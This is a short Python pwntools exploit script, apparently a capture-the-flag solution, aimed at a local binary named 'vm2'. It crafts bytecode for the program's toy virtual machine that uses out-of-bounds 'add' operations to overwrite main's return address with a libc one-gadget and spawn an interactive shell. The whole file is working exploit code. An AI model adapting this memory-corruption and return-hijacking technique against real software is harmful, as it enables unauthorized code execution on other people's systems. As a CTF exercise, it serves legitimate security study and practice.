from pwn import *
from icecream import ic
import tty

# Set up pwntools for the correct architecture
exe = "./vm2"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("", )
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* 0x555555555228
    c
'''.format(**locals())

# Useful macros
def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()
eof = chr(tty.CEOF)

# Basic assembler
def add(ind1, ind2):
    return b"\x00" + p32(ind1) + p32(ind2)

def ret():
    return b"\x03"

r = start()

offset_to_main_ret = 0x92

bytecode = add(0x92, 0x14)
bytecode += add(0x91, 0x92)
bytecode += add(0x91, 0x15)
bytecode += ret() + b"\x00"*4
bytecode += p64(0xebd43-0x29d90) + p64(0x12e51c) # one gadget offset
sl(bytecode)

r.interactive()
